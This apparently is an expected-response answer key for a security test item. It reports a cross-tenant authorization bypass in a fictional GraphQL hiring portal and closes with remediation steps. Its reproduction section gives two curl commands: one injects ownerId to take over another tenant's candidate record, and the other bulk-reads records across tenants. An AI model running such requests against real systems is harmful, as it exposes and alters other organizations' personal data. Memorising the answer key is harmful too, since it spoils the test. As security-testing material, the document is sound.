# Expected Response

## System
- Domain: HR Tech / Talent Acquisition
- System: JobCore Candidate Portal
- Example ID: GQL-0059

## Priority Findings

### Finding 1: Authorization-Bypass via ownerId Injection in updateCandidate — Cross-Tenant Candidate Record Takeover (Pattern 5.1)
**Severity:** Critical
**Category:** Injection / BOLA

**Summary:**
The `updateCandidate` mutation on `POST /graphql` accepts `ownerId` as a writable field in `CandidateInput`. An attacker from `tenant-2eec` targeted candidate record `C-2059` (belonging to `tenant-14dc`), injecting `status: "approved"` and `ownerId: "attacker-2eec14dc"`. The response `200 OK` with `tenant-14dc` data confirms the authorization was bypassed through parameter injection. In HR/talent acquisition, fraudulently approving a cross-tenant candidate record can manipulate hiring pipelines.

**Evidence from HAR:**
- Request: `POST https://api.jobcore-candidate-po.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-2eec`
- Mutation: `updateCandidate(id: "C-2059", input: {status: "approved", ownerId: "attacker-2eec14dc"})` 
- Response `200 OK`; `tenantId: "tenant-14dc"`, `ownerId: "other-user-2eec14dc"`, `sensitiveField: "CONFIDENTIAL-2eec14dc"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-2eec14dc`

**Root Cause (§4.0 RISK-GQL-059 + §5.0):** `candidateId` resolver fetches without tenant guard; `CandidateInput` accepts `ownerId` enabling injection-based authorization bypass.

## Steps to Reproduce

### Step 1 — Cross-tenant candidate write + ownerId injection (HAR)
```bash
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-2eec" \
  -d '{"query": "mutation { updateCandidate(id: \"C-2059\", input: {status: \"approved\", ownerId: \"attacker-2eec14dc\"}) { candidateId status tenantId } }"}'
```
**Vulnerable:** `C-2059` (`tenant-14dc`) updated to `approved`, ownerId hijacked. **Secure:** FORBIDDEN.

### Step 2 — Bulk cross-tenant candidate enumeration
```bash
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-2eec" \
  -d '{"query": "mutation { bulkCandidateLookup(ids: [\"C-2059\", \"C-14dc-002\"]) { candidateId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns candidate records from `tenant-14dc`.

## Remediation
1. Resolver tenant guard on `updateCandidate`/`getCandidate`.
2. Strip `ownerId` from `CandidateInput`.
3. Per-ID ownership filter in bulk lookups.
4. Redis cache key includes `tenantId`.
